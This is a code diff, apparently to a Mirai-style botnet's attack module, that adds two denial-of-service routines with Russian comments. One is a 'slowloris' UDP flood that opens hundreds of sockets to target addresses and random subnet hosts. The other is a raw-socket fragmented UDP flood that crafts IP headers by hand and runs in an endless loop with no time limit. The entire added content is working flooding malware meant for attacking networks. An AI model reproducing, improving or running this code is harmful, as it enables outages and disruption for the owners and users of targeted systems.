@@ -1651,3 +1651,157 @@ static ipv4_t get_dns_resolver(void)
         return INET_ADDR(4,2,2,2);
     }
 }
+
+void attack_slowloris_udp(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
+{
+    int i;
+    int max_conns = attack_get_opt_int(opts_len, opts, ATK_OPT_CONNS, 300);
+    int duration = attack_get_opt_int(opts_len, opts, ATK_OPT_DURATION, 60);
+    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
+    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
+    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 256);
+
+    int *fds = calloc(max_conns, sizeof(int));
+    if (fds == NULL)
+        return;
+
+    struct sockaddr_in addr;
+    addr.sin_family = AF_INET;
+
+    time_t start = time(NULL);
+
+    // создаем udp сокеты
+    int idx = 0;
+    for (i = 0; i < targs_len && idx < max_conns; i++)
+    {
+        int r;
+        for (r = 0; r < max_conns / targs_len && idx < max_conns; r++)
+        {
+            int fd = socket(AF_INET, SOCK_DGRAM, 0);
+            if (fd < 0)
+                continue;
+
+            if (sport != 0xffff)
+            {
+                struct sockaddr_in bind_addr;
+                bind_addr.sin_family = AF_INET;
+                bind_addr.sin_addr.s_addr = INADDR_ANY;
+                bind_addr.sin_port = htons(sport);
+                bind(fd, (struct sockaddr *)&bind_addr, sizeof(bind_addr));
+            }
+
+            if (targs[i].netmask < 32)
+                addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
+            else
+                addr.sin_addr.s_addr = targs[i].addr;
+            addr.sin_port = (dport == 0xffff) ? rand_next() & 0xffff : htons(dport);
+
+            connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
+            fds[idx++] = fd;
+        }
+    }
+
+    // медленно отправляем udp пакеты
+    while (time(NULL) - start < duration)
+    {
+        for (i = 0; i < idx; i++)
+        {
+            if (fds[i] > 0)
+            {
+                char payload[512];
+                int len = rand_next() % data_len + 32;
+                rand_str(payload, len);
+                send(fds[i], payload, len, MSG_NOSIGNAL);
+            }
+        }
+        usleep(rand_next() % 10000 + 2000);
+    }
+
+    for (i = 0; i < max_conns; i++)
+        if (fds[i] > 0) close(fds[i]);
+    free(fds);
+}
+
+void attack_udp_frag(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
+{
+    int i, rfd;
+    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
+    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
+    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
+    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
+    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
+    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 1024);
+    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
+
+    if ((rfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)
+        return;
+
+    i = 1;
+    if (setsockopt(rfd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
+    {
+        close(rfd);
+        return;
+    }
+
+    while (TRUE)
+    {
+        for (i = 0; i < targs_len; i++)
+        {
+            // фрагментированный udp пакет
+            int fragment_size = 512;
+            int num_fragments = (data_len + fragment_size - 1) / fragment_size;
+            int frag_id = rand_next() & 0xffff;
+            int offset = 0;
+
+            for (int frag = 0; frag < num_fragments; frag++)
+            {
+                char packet[1024];
+                struct iphdr *iph = (struct iphdr *)packet;
+                struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct iphdr));
+                char *data = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
+                int this_frag_size = (frag == num_fragments - 1) ? (data_len - offset) : fragment_size;
+
+                iph->version = 4;
+                iph->ihl = 5;
+                iph->tos = ip_tos;
+                iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + this_frag_size);
+                iph->id = htons(frag_id);
+                
+                // устанавливаем флаг MF (more fragments) для всех кроме последнего
+                int more_frags = (frag < num_fragments - 1) ? 0x2000 : 0;
+                iph->frag_off = htons((offset >> 3) | more_frags);
+                
+                iph->ttl = ip_ttl;
+                iph->protocol = IPPROTO_UDP;
+                iph->check = 0;
+                iph->saddr = LOCAL_ADDR;
+
+                if (targs[i].netmask < 32)
+                    iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
+                else
+                    iph->daddr = targs[i].addr;
+
+                // udp header только в первом фрагменте
+                if (frag == 0)
+                {
+                    udph->source = (sport == 0xffff) ? rand_next() & 0xffff : htons(sport);
+                    udph->dest = (dport == 0xffff) ? rand_next() & 0xffff : htons(dport);
+                    udph->len = htons(sizeof(struct udphdr) + data_len);
+                    udph->check = 0;
+                }
+
+                if (data_rand)
+                    rand_str(data, this_frag_size);
+
+                iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
+
+                targs[i].sock_addr.sin_port = (dport == 0xffff) ? rand_next() & 0xffff : htons(dport);
+                sendto(rfd, packet, sizeof(struct iphdr) + sizeof(struct udphdr) + this_frag_size, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
+
+                offset += this_frag_size;
+            }
+        }
+    }
+
+    close(rfd);
+}
